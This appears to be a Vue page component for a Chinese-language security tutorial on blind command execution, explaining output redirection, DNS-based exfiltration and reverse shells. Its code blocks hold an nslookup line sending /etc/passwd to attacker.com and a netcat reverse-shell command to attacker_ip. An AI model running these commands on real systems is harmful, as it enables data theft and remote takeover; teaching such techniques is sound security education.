<template>
        <div>
                <el-row>
                        <!-- 主要内容区域 -->
                        <el-col :span="19">
                                <div ref="containerRef" style="color: #fff; height: 650px; overflow-y: auto">
                                        <div id="part0" style="height: 100px;"></div>
                                        <div id="part2" style="height: auto;">
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <div id="p2" style="height: auto;">
                                                                <h1 class="title">无回显的命令执行</h1>
                                                                <el-divider />
                                                                <br>

                                                                <!-- 无回显命令执行原理 -->
                                                                <h2 class="sub-title" id="p2-1">原理</h2>
                                                                <p>无回显的命令执行是指在执行命令后,不会将命令执行的结果直接返回给攻击者.<br>
                                                                这通常是因为应用程序在设计时没有将命令执行的输出进行处理或者返回,或者是为了防止信息泄露而故意隐藏了输出.
                                                                </p>
                                                                <p>例如,在某些Web应用中,可能会调用系统命令来完成一些特定的任务,如文件处理、数据备份等,但这些命令的执行结果不会显示在页面上.<br>
                                                                攻击者可以利用这种情况,通过构造特殊的命令来绕过应用程序的过滤机制,执行恶意命令.
                                                                </p>
                                                                <br>
                                                                <br>
                                                                <br>

                                                                <!-- 绕过方法 -->
                                                                <h1 class="title" id="p3">绕过方法</h1>
                                                                <el-divider />
                                                                <br>
                                                                <ul>
                                                                        <!-- 重定向输出 -->
                                                                        <li>
                                                                                <h2 class="sub-title">1. 重定向输出</h2>
                                                                                <p>攻击者可以将命令执行的输出重定向到一个文件中,然后通过访问该文件来获取命令执行的结果.
                                                                                </p>
                                                                                <el-card style="max-width:750px; background-color:#161b22;"
                                                                                        body-style="line-height: 2">
                                                                                        <pre class="code-block">
<span class="token comment"># 将ls命令的输出重定向到/tmp/output.txt文件中</span>
<span class="token string">ls -al <span style="color: #ff7b72;">&gt;</span> /tmp/output.txt</span></pre>
                                                                                </el-card>
                                                                                <p>在这个示例中,<el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">ls
                                                                                                -al</el-tag>
                                                                                        命令用于列出当前目录下的所有文件和文件夹的详细信息,包括文件权限、所有者、大小、修改时间等.<br>
                                                                                        <el-tag
                                                                                                style="color:#ff7b72;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">&gt;</el-tag>
                                                                                        是重定向符号,它将 <el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">ls
                                                                                                -al</el-tag> 命令的输出结果写入到
                                                                                        <el-tag style="color:#ff7b72;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">/tmp/output.txt</el-tag>
                                                                                        文件中.<br>
                                                                                        攻击者可以通过访问 <el-tag
                                                                                                style="color:#ff7b72;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">/tmp/output.txt</el-tag>
                                                                                        文件来获取命令执行的结果.
                                                                                </p>
                                                                        </li>

                                                                        <br>
                                                                        <!-- DNS请求 -->
                                                                        <li>
                                                                                <h2 class="sub-title">2. DNS请求</h2>
                                                                                <p>攻击者可以构造一个包含命令执行结果的DNS请求,通过监控DNS服务器的日志来获取命令执行的结果.
                                                                                </p>
                                                                                <el-card style="max-width:750px; background-color:#161b22;"
                                                                                        body-style="line-height: 2">
                                                                                        <pre class="code-block">
<span class="token comment"># 将/etc/passwd文件的内容作为子域名发送DNS请求</span>
<span class="token string">nslookup `cat <span style="color: #ff7b72;">/etc/passwd</span>`.attacker.com</span></pre>
                                                                                </el-card>
                                                                                <p>在这个示例中,<el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">cat
                                                                                <span style="color: #ff7b72;">/etc/passwd</span></el-tag>
                                                                                        命令用于读取 <el-tag
                                                                                                style="color:#ff7b72;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">/etc/passwd</el-tag>
                                                                                        文件的内容,该文件包含了系统用户的信息.<br>
                                                                                        反引号(`)在Shell中用于命令替换,即将反引号内的命令执行结果替换到所在的位置.<br>
                                                                                        <el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">nslookup</el-tag>
                                                                                        是一个用于查询DNS记录的命令,攻击者将 <el-tag
                                                                                                style="color:#ff7b72;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">/etc/passwd</el-tag>
                                                                                        文件的内容作为子域名,向 <el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">attacker.com</el-tag>
                                                                                        发送DNS请求.通过监控DNS服务器的日志,攻击者可以获取到
                                                                                        <el-tag style="color:#ff7b72;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">/etc/passwd</el-tag>
                                                                                        文件的内容.
                                                                                </p>
                                                                        </li>

                                                                        <br>
                                                                        <!-- 反弹Shell -->
                                                                        <li>
                                                                                <h2 class="sub-title">3. 反弹Shell
                                                                                </h2>
                                                                                <p>攻击者可以通过反弹Shell的方式,让目标服务器主动连接到攻击者的服务器,从而获取一个交互式的Shell.
                                                                                </p>
                                                                                <el-card style="max-width:750px; background-color:#161b22;"
                                                                                        body-style="line-height: 2">
                                                                                        <pre class="code-block">
<span class="token comment">// 使用nc命令反弹Shell到攻击者的服务器</span>
<span class="token string">nc -e /bin/sh attacker_ip attacker_port</span></pre>
                                                                                </el-card>
                                                                                <p>在这个示例中,<el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">nc</el-tag>
                                                                                        是一个网络工具,全称为 <el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">netcat</el-tag>,它可以用于创建TCP或UDP连接.<br>
                                                                                                <el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">-e</el-tag>
                                                                                        选项用于指定要执行的命令,这里指定为 <el-tag
                                                                                                style="color:#ff7b72;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">/bin/sh</el-tag>,即启动一个Shell.<br>
                                                                                                <el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">attacker_ip</el-tag>
                                                                                        是攻击者服务器的IP地址,<el-tag
                                                                                                style="color:#a5d6ff;font-size: 14px;"
                                                                                                type="info"
                                                                                                size="large">attacker_port</el-tag>
                                                                                        是攻击者服务器监听的端口号.<br>
                                                                                        当目标服务器执行该命令时,会主动连接到攻击者的服务器,并将一个交互式的Shell发送给攻击者<br>
                                                                                        攻击者可以通过连接到该服务器来获取目标服务器的控制权.
                                                                                </p>
                                                                        </li>
                                                                </ul>
                                                        </div>
                                                </el-text>
                                        </div>
                                </div>
                        </el-col>
 <!-- 目录区域 - 修改为Vue2格式 -->
 <el-col :span="5">
        <el-affix :offset="60">
          <el-menu 
            :default-active="activeAnchor" 
            class="tech-anchor" 
            mode="vertical"
            @select="handleAnchorSelect"
          >
            <el-menu-item-group title="本页目录">
              <el-menu-item index="p2">无回显的命令执行</el-menu-item>
              <el-submenu index="p2-sub">
                <template slot="title">子目录</template>
                <el-menu-item index="p2-1">原理</el-menu-item>
              </el-submenu>
              <el-menu-item index="p3">绕过方法</el-menu-item>
              <el-submenu index="p3-sub">
                <template slot="title">子目录</template>
                <el-menu-item index="p3-1">重定向输出</el-menu-item>
                <el-menu-item index="p3-2">DNS请求</el-menu-item>
                <el-menu-item index="p3-3">反弹Shell</el-menu-item>
              </el-submenu>
            </el-menu-item-group>
          </el-menu>
        </el-affix>
      </el-col>
    </el-row>
  </div>
</template>

<script>
export default {
  data() {
    return {
      containerRef: null,
      activeAnchor: 'p2',
      scrollTimer: null
    }
  },
  mounted() {
    this.containerRef = this.$refs.containerRef
    window.addEventListener('scroll', this.handleScroll)
  },
  beforeDestroy() {
    window.removeEventListener('scroll', this.handleScroll)
    clearTimeout(this.scrollTimer)
  },
  methods: {
    handleAnchorSelect(index) {
      this.activeAnchor = index
      const target = document.getElementById(index)
      if (target) {
        target.scrollIntoView({ behavior: 'smooth' })
      }
    },
    handleScroll() {
      clearTimeout(this.scrollTimer)
      this.scrollTimer = setTimeout(() => {
        const sections = ['p2', 'p2-1', 'p3', 'p3-1', 'p3-2', 'p3-3']
        const scrollPosition = window.scrollY || document.documentElement.scrollTop
        
        for (let i = sections.length - 1; i >= 0; i--) {
          const section = document.getElementById(sections[i])
          if (section && section.offsetTop <= scrollPosition + 100) {
            this.activeAnchor = sections[i]
            break
          }
        }
      }, 100)
    },
    handleClick(e) {
      e.preventDefault()
    }
  }
}
</script>

<style lang="less" scoped>
::-webkit-scrollbar {
  display: none;
}
/* 标题样式 */
h1.title {
  margin: 0 0 3rem;
  font-size: 38px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

h2.sub-title {
  margin: 0 0 3rem;
  font-size: 25px;
  line-height: 1.4;
  letter-spacing: -.02em;
  font-weight: 800;
  text-align: left;
  font-family: 'Orbitron','微软雅黑';
}

/* 代码块样式 */
.code {
  color: #fff;
  font-family: 'Cascadia Code', monospace;
}

.key {
  color: #e1567b;
  font-family: 'Cascadia Code', monospace;
}

.cmt {
  color: #6a6a6a;
  font-family: 'Cascadia Code', monospace;
  font-size: 15px;
}

.num {
  color: #8e5fa0;
  font-family: 'Cascadia Code', monospace;
}

/* 组件样式 */
.el-tag {
  background-color: #3d3b3b;
  color: #fff;
  border-color: #282C34;
}

.el-card {
  background-color: #282C34;
  color: #fff;
  border-color: #282C34;
}

.el-text {
  color: #fff;
}

/* 目录菜单样式 */
.tech-anchor {
  position: fixed;
  right: 20px;
  background: rgba(10, 17, 40, 0.7);
  border-radius: 4px;
  padding: 15px;
  box-shadow: 0 0 15px rgba(0, 123, 255, 0.1);
  border-left: 1px solid rgba(0, 123, 255, 0.3);
  width: 220px;
  
  /deep/ .el-menu {
    background-color: transparent;
    border-right: none;
  }
  
  /deep/ .el-menu-item-group__title {
    color: #d1e7ff;
    font-family: 'Cascadia Code', '微软雅黑';
    padding-left: 0;
    font-size: 16px;
    border-bottom: 1px solid rgba(0, 123, 255, 0.3);
    margin-bottom: 10px;
  }
  
  /deep/ .el-menu-item {
    color: #a0c4ff;
    height: 36px;
    line-height: 36px;
    font-size: 14px;
    padding-left: 20px !important;
    
    &:hover {
      color: #ffffff !important;
      background: rgba(0, 123, 255, 0.2);
    }
    
    &.is-active {
      color: #ffffff !important;
      background: rgba(0, 123, 255, 0.3);
      border-left: 2px solid #007bff;
    }
  }
  
  /deep/ .el-submenu__title {
    color: #a0c4ff;
    height: 36px;
    line-height: 36px;
    font-size: 14px;
    
    &:hover {
      color: #ffffff !important;
      background: rgba(0, 123, 255, 0.2);
    }
  }
}

/* 响应式调整 */
@media (max-width: 1200px) {
  .tech-anchor {
    width: 180px;
    right: 10px;
  }
}

@media (max-width: 992px) {
  .tech-anchor {
    position: static;
    width: 100%;
    margin-bottom: 20px;
  }
  
  /deep/ .el-col-5 {
    width: 100%;
  }
  
  /deep/ .el-col-19 {
    width: 100%;
  }
}
</style>